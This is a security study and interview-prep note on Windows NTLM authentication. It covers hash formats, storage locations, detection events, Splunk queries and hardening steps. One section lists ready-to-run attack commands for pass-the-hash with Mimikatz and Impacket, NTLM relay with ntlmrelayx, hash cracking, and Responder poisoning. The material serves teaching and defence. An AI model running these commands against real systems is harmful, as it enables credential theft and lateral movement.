---
dg-publish: true
tags:
  - "#cybersecurity/iam/authentication"
  - "#interview/concepts"
  - "#cybersecurity/windows"
aliases:
  - NT LAN Manager
  - Windows Password Hash
---

# NTLM

> **One-liner:** Windows' legacy challenge-response authentication protocol that stores password hashes using weak MD4-based cryptography.

## 🎯 What Is It?
NTLM (NT LAN Manager) is Microsoft's proprietary authentication protocol used in Windows environments. It uses a challenge-response mechanism to verify user credentials without sending passwords over the network. Despite being superseded by [[Kerberos]], NTLM remains enabled for backward compatibility, making it a common target for attacks.

**Hash Format:**
```
Username:RID:LM_Hash:NTLM_Hash:::
```

Example NTLM hash:
```
Admin:500:NO_LM_HASH:8846F7EAEE8FB117AD06BDD830B7586C:::
```

## 🤔 Why It Matters

### For Attackers (Red Team)
- **Pass-the-Hash (PtH):** Use captured hash without cracking
- **NTLM Relay:** Relay authentication to other systems
- **Hash cracking:** MD4 is weak and fast to crack
- **Lateral movement:** Compromise enables domain traversal

### For Defenders (Blue Team)
- **Detection:** Monitor for Pass-the-Hash attacks
- **Hardening:** Disable NTLM where possible
- **Forensics:** Hash format in [[SAM]] database and memory dumps
- **Incident Response:** Credential compromise investigation

## 🔬 How It Works

### Authentication Flow
```
1. Client → Server: "I want to authenticate as Alice"
2. Server → Client: [Challenge] (8-byte random nonce)
3. Client: Encrypts challenge with NTLM hash
4. Client → Server: [Response]
5. Server: Decrypts response, verifies match
6. Server → Client: Access granted/denied
```

### Hash Generation
```
Password: "P@ssw0rd"
   ↓
MD4 Hash → NTLM Hash: 8846F7EAEE8FB117AD06BDD830B7586C
```

**Note:** No salt is used, making rainbow tables effective.

### Where NTLM Hashes are Stored

| Location | Description | Access Level |
|----------|-------------|--------------|
| **SAM** (Security Account Manager) | Local user accounts (`C:\Windows\System32\config\SAM`) | SYSTEM privileges required |
| **LSASS** (Local Security Authority Subsystem) | In-memory | Admin/SYSTEM, use Mimikatz |
| **NTDS.dit** | Active Directory database | Domain Controller access |

## 📊 NTLM vs NTLMv2 vs Kerberos

| Protocol | Hash Algorithm | Salted? | Vulnerability | Status |
|----------|----------------|---------|---------------|--------|
| **LM** (LAN Manager) | DES | No | Extremely weak, 14 char limit | Disabled by default (Win Vista+) |
| **NTLM (v1)** | MD4 | No | Pass-the-Hash, weak | Legacy, still enabled |
| **NTLMv2** | MD4 + HMAC-MD5 | Yes | More secure but still vulnerable | Default fallback |
| **Kerberos** | Ticket-based | Yes | Ticket attacks (Golden/Silver) | Preferred, default AD auth |

## 🔓 Common Attacks

### 1. Pass-the-Hash (PtH)
Use the hash directly without cracking:
```bash
# Using Mimikatz
sekurlsa::pth /user:Admin /domain:CORP /ntlm:8846F7EAEE8FB117AD06BDD830B7586C

# Using Impacket
psexec.py -hashes :8846F7EAEE8FB117AD06BDD830B7586C admin@10.10.10.10
```

### 2. NTLM Relay
Relay captured authentication to another system:
```bash
# Capture NTLM auth from victim
# Relay to target server for access
ntlmrelayx.py -t smb://192.168.1.100 -smb2support
```

### 3. Hash Cracking
```bash
# Using Hashcat (mode 1000 for NTLM)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Using John the Ripper
john --format=NT hashes.txt --wordlist=rockyou.txt
```

### 4. [[Responder]] Poisoning
Capture NTLM hashes via LLMNR/NBT-NS poisoning:
```bash
responder -I eth0 -wrf
# Captured NTLMv2 hashes can then be cracked offline
```

## 🛡️ Detection & Prevention

### How to Detect (Blue Team)

#### Event Log Monitoring
| Event ID | Description | Indicator |
|----------|-------------|-----------|
| **4624** | Successful logon | Type 3 (network) from unusual source |
| **4625** | Failed logon | Multiple failures (brute-force) |
| **4648** | Explicit credentials used | Pass-the-Hash indicator |
| **4776** | NTLM authentication attempt | Monitor for NTLMv1 usage |

#### Detection Queries (Splunk)
```spl
# Detect Pass-the-Hash
index=windows EventCode=4624 Logon_Type=3 Authentication_Package=NTLM
| where Source_Network_Address!="localhost"
| stats count by Account_Name, Source_Network_Address
```

#### Indicators
- Logon Type 3 (network) with NTLM from unexpected IPs
- Multiple logins from same hash across different systems
- NTLM authentication when Kerberos should be used
- NTLMv1 usage (should be disabled)

### How to Prevent / Mitigate

| Control | Implementation | Impact |
|---------|----------------|--------|
| **Disable NTLM** | Group Policy: Network Security: Restrict NTLM | High (breaks legacy apps) |
| **Enforce NTLMv2** | Registry: `LmCompatibilityLevel = 5` | Medium |
| **SMB Signing** | Require SMB signing (prevents relay) | Low |
| **LAPS** | Local Admin Password Solution | Prevents lateral movement |
| **Credential Guard** | Windows Defender Credential Guard | Protects LSASS memory |
| **Strong Passwords** | 15+ characters (makes cracking harder) | Medium |

#### Disable NTLM (Group Policy)
```
Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
→ Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers
→ Set to "Deny all"
```

## 🎤 Interview Angles

### Common Questions
- **"What is NTLM and why is it a security risk?"**
  - *"NTLM is Windows' legacy authentication protocol using MD4 hashes. It's risky because hashes aren't salted, enabling Pass-the-Hash attacks where attackers use the hash directly without cracking it. It's also vulnerable to relay attacks."*

- **"How does Pass-the-Hash work?"**
  - *"If an attacker captures an NTLM hash from memory or a SAM database, they can authenticate as that user without knowing the actual password. Tools like Mimikatz extract hashes from LSASS memory, then use them directly for authentication."*

- **"How would you detect Pass-the-Hash in your environment?"**
  - *"Monitor Event ID 4624 for Logon Type 3 with NTLM authentication from unusual source IPs. Look for the same account authenticating from multiple systems rapidly, or authentication patterns that bypass Kerberos when it should be used."*

- **"What's the difference between NTLM and Kerberos?"**
  - *"NTLM is a challenge-response protocol that's older and less secure. Kerberos uses tickets and a Key Distribution Center, providing mutual authentication and better security. Kerberos is the default in Active Directory, but NTLM remains for backward compatibility."*

### STAR Story
> **Situation:** SOC detected unusual lateral movement—same admin account authenticating to dozens of servers within minutes, all using NTLM instead of Kerberos.
> **Task:** Investigate potential Pass-the-Hash attack and contain the threat.
> **Action:** Analyzed Event ID 4624 logs, identified source workstation with anomalous NTLM authentication pattern. Isolated compromised system, extracted memory dump using WinPmem, confirmed Mimikatz execution via prefetch files. Reset compromised account password, implemented LAPS on all endpoints, and enabled Credential Guard on critical servers.
> **Result:** Contained incident within 2 hours, prevented further lateral movement. Reduced NTLM usage by 80% through Group Policy enforcement. Deployed detection rules for future Pass-the-Hash attempts.

## ✅ Best Practices
- Disable NTLMv1, enforce NTLMv2 minimum
- Audit and reduce NTLM usage (use Kerberos)
- Enable [[SMB]] signing to prevent relay attacks
- Deploy LAPS (Local Admin Password Solution)
- Use Credential Guard on Windows 10+ Enterprise
- Monitor Event ID 4776 for NTLM authentication attempts
- Require 15+ character passwords (defeats LM hash generation)

## ❌ Common Misconceptions
- **"Disabling NTLM is always safe"** → Can break legacy apps, requires testing
- **"NTLMv2 is secure"** → Better than v1, but still vulnerable to relay and PtH
- **"Kerberos eliminates all credential attacks"** → Kerberos has its own attacks (Golden/Silver Ticket)
- **"NTLM hashes can't be used without cracking"** → Pass-the-Hash works with the hash directly

## 🔗 Related Concepts
- [[Authentication]]
- [[Kerberos]]
- [[Pass-the-Hash (PtH)]]
- [[Mimikatz]]
- [[Active Directory]]
- [[Privilege Escalation]]
- [[Lateral Movement]]
- [[015 🔐 Cryptography & Identity MOC]]
- [[011 🛡️ Blue Team & SOC Operations MOC]]
- [[012 ⚔️ Red Team & Offensive Security MOC]]

## 📚 References
- Microsoft: NTLM Overview
- MITRE ATT&CK: T1550.002 (Use Alternate Authentication Material: Pass the Hash)
- SANS: Detecting and Preventing Pass-the-Hash Attacks
- https://hashcat.net/wiki/doku.php?id=example_hashes (hash modes)
